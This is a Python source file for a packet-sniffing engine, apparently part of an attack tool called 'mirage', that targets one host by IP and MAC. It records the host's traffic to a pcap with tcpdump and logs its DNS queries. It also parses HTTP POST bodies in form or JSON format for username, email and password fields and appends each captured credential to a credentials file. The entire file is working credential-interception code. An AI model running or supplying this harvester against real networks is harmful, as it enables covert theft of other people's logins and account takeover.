from __future__ import annotations

import json
import os
import re
import subprocess
import threading
import time
import uuid
from collections import deque
from pathlib import Path

from scapy.all import (
    DNS,
    DNSQR,
    ICMP,
    IP,
    Raw,
    TCP,
    UDP,
    sniff,
)


class SnifferEngine:
    def __init__(
        self,
        interface: str,
        target_ip: str,
        target_mac: str,
        on_log,
        on_credential,
        on_traffic,
        on_packet,
    ):
        self.interface = interface
        self.target_ip = target_ip
        self.target_mac = target_mac

        self.on_log = on_log
        self.on_credential = on_credential
        self.on_traffic = on_traffic
        self.on_packet = on_packet

        self.stop_event = threading.Event()

        self.thread: threading.Thread | None = None
        self.traffic_thread: threading.Thread | None = None

        self.tcpdump_proc: subprocess.Popen | None = None

        self.lifecycle_lock = threading.Lock()

        safe_target = re.sub(
            r"[^A-Za-z0-9_.-]",
            "_",
            target_mac or target_ip,
        )

        self.log_dir = Path(
            "logs"
        ) / safe_target

        self.log_dir.mkdir(
            parents=True,
            exist_ok=True,
        )

        self.pcap_path = (
            self.log_dir
            / "capture.pcap"
        )

        self.cred_path = (
            self.log_dir
            / "credentials.txt"
        )

        self.rx_bytes = 0
        self.tx_bytes = 0
        self.byte_lock = threading.Lock()

        self.packet_queue = deque(
            maxlen=2000
        )

        self.queue_lock = threading.Lock()

        self.dropped_packets = 0

        self.started = False

    def start(self) -> None:
        with self.lifecycle_lock:
            if self.started:
                raise RuntimeError(
                    "Sniffer is already running"
                )

            self.stop_event.clear()

            try:
                self.tcpdump_proc = (
                    subprocess.Popen(
                        [
                            "tcpdump",
                            "-U",
                            "-i",
                            self.interface,
                            "-w",
                            str(self.pcap_path),
                            "host",
                            self.target_ip,
                        ],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                )

            except OSError as exc:
                raise RuntimeError(
                    f"Failed to start tcpdump: {exc}"
                ) from exc

            try:
                self.thread = threading.Thread(
                    target=self._sniff_loop,
                    name="mirage-sniffer",
                    daemon=True,
                )

                self.traffic_thread = (
                    threading.Thread(
                        target=self._traffic_loop,
                        name="mirage-traffic",
                        daemon=True,
                    )
                )

                self.thread.start()
                self.traffic_thread.start()

                self.started = True

                self.on_log(
                    f"[*] Sniffer started. PCAP: {self.pcap_path}"
                )

            except Exception:
                self._stop_tcpdump()
                raise

    def stop(self) -> None:
        with self.lifecycle_lock:
            if not self.started:
                return

            self.stop_event.set()

            self._stop_tcpdump()

            thread = self.thread
            traffic_thread = (
                self.traffic_thread
            )

            if (
                thread is not None
                and thread.is_alive()
            ):
                thread.join(
                    timeout=3
                )

                if thread.is_alive():
                    raise RuntimeError(
                        "Sniffer thread did not stop gracefully"
                    )

            if (
                traffic_thread is not None
                and traffic_thread.is_alive()
            ):
                traffic_thread.join(
                    timeout=3
                )

                if traffic_thread.is_alive():
                    raise RuntimeError(
                        "Traffic thread did not stop gracefully"
                    )

            self._flush_packets()

            self.thread = None
            self.traffic_thread = None
            self.started = False

            self.on_log(
                "[!] Sniffer stopped. "
                f"Dropped packets: {self.dropped_packets}"
            )

    def _stop_tcpdump(self) -> None:
        process = self.tcpdump_proc

        if process is None:
            return

        try:
            if process.poll() is None:
                process.terminate()

                try:
                    process.wait(
                        timeout=2
                    )
                except subprocess.TimeoutExpired:
                    process.kill()
                    process.wait(
                        timeout=2
                    )
        finally:
            self.tcpdump_proc = None

    def _traffic_loop(self) -> None:
        while not self.stop_event.wait(
            timeout=1.0
        ):
            with self.byte_lock:
                rx_kb = round(
                    self.rx_bytes / 1024,
                    1,
                )

                tx_kb = round(
                    self.tx_bytes / 1024,
                    1,
                )

                self.rx_bytes = 0
                self.tx_bytes = 0

            self.on_traffic(
                rx_kb,
                tx_kb,
            )

            self._flush_packets()

    def _flush_packets(self) -> None:
        with self.queue_lock:
            if not self.packet_queue:
                return

            packets = list(
                self.packet_queue
            )

            self.packet_queue.clear()

        for index in range(
            0,
            len(packets),
            25,
        ):
            batch = packets[
                index:index + 25
            ]

            self.on_packet(
                batch
            )

    def _sniff_loop(self) -> None:
        packet_filter = (
            f"host {self.target_ip}"
        )

        while not self.stop_event.is_set():
            try:
                sniff(
                    iface=self.interface,
                    filter=packet_filter,
                    prn=self._process_packet,
                    store=False,
                    timeout=1,
                )

            except Exception as exc:
                if not self.stop_event.is_set():
                    self.on_log(
                        f"[-] Sniffer error: {exc}"
                    )

                break

    def _process_packet(
        self,
        packet,
    ) -> None:
        if self.stop_event.is_set():
            return

        if packet.haslayer(IP):
            packet_length = len(packet)

            source_ip = packet[
                IP
            ].src

            destination_ip = packet[
                IP
            ].dst

            with self.byte_lock:
                if (
                    destination_ip
                    == self.target_ip
                ):
                    self.rx_bytes += packet_length

                elif (
                    source_ip
                    == self.target_ip
                ):
                    self.tx_bytes += packet_length

            protocol = "IP"
            source_port = ""
            destination_port = ""
            flags = ""

            if packet.haslayer(TCP):
                protocol = "TCP"
                source_port = str(
                    packet[TCP].sport
                )
                destination_port = str(
                    packet[TCP].dport
                )
                flags = str(
                    packet[TCP].flags
                )

            elif packet.haslayer(UDP):
                protocol = "UDP"
                source_port = str(
                    packet[UDP].sport
                )
                destination_port = str(
                    packet[UDP].dport
                )

            elif packet.haslayer(ICMP):
                protocol = "ICMP"

            packet_data = {
                "id": str(
                    uuid.uuid4()
                ),
                "type": protocol,
                "summary": (
                    f"[{protocol}] "
                    f"{source_ip}:{source_port} -> "
                    f"{destination_ip}:{destination_port} "
                    f"({packet_length}B)"
                ),
                "src_ip": source_ip,
                "dst_ip": destination_ip,
                "src_port": source_port,
                "dst_port": destination_port,
                "length": packet_length,
                "flags": flags,
                "payload_ascii": "",
                "payload_hex": "",
            }

            if packet.haslayer(Raw):
                payload = packet[
                    Raw
                ].load

                packet_data[
                    "payload_ascii"
                ] = payload.decode(
                    "utf-8",
                    errors="ignore",
                )[:1000]

                packet_data[
                    "payload_hex"
                ] = payload.hex()[:2000]

            with self.queue_lock:
                if (
                    len(self.packet_queue)
                    >= self.packet_queue.maxlen
                ):
                    self.dropped_packets += 1

                self.packet_queue.append(
                    packet_data
                )

        if (
            packet.haslayer(DNS)
            and packet.haslayer(DNSQR)
            and packet[DNS].qr == 0
        ):
            domain = (
                packet[
                    DNSQR
                ].qname
                .decode(
                    "utf-8",
                    errors="ignore",
                )
                .rstrip(".")
            )

            if (
                domain
                and not domain.endswith(".lan")
                and not domain.endswith(".local")
            ):
                self.on_log(
                    f"[DNS] Observed plaintext query: {domain}"
                )

        if (
            packet.haslayer(TCP)
            and packet.haslayer(Raw)
        ):
            try:
                payload = packet[
                    Raw
                ].load.decode(
                    "utf-8",
                    errors="strict",
                )

                lowered = payload.lower()

                if (
                    "post" in lowered
                    and (
                        "pass" in lowered
                        or "user" in lowered
                        or "login" in lowered
                    )
                ):
                    self._extract_credentials(
                        payload
                    )

            except UnicodeDecodeError:
                return

    def _extract_credentials(
        self,
        payload: str,
    ) -> None:
        credentials: list[str] = []

        matches = re.findall(
            r"(\w+)=([^\s&]+)",
            payload,
        )

        sensitive_keys = (
            "user",
            "name",
            "email",
            "login",
            "pass",
            "pwd",
            "password",
        )

        for key, value in matches:
            if any(
                keyword in key.lower()
                for keyword in sensitive_keys
            ):
                credentials.append(
                    f"{key} = {value}"
                )

        if (
            not credentials
            and "{"
            in payload
        ):
            body = payload.split(
                "\r\n\r\n",
                1,
            )[-1]

            try:
                data = json.loads(
                    body
                )

                if isinstance(
                    data,
                    dict,
                ):
                    for key, value in data.items():
                        if any(
                            keyword in key.lower()
                            for keyword in sensitive_keys
                        ):
                            credentials.append(
                                f"{key} = {value}"
                            )

            except (
                json.JSONDecodeError,
                ValueError,
            ):
                return

        if not credentials:
            return

        credential_text = "\n".join(
            credentials
        )

        self.on_log(
            "[!] Plaintext credential candidate observed"
        )

        self.on_credential(
            credential_text
        )

        try:
            with self.cred_path.open(
                "a",
                encoding="utf-8",
            ) as file:
                file.write(
                    f"--- Captured "
                    f"{time.strftime('%Y-%m-%d %H:%M:%S')} ---\n"
                    f"{credential_text}\n\n"
                )

        except OSError as exc:
            self.on_log(
                f"[-] Failed to save credential log: {exc}"
            )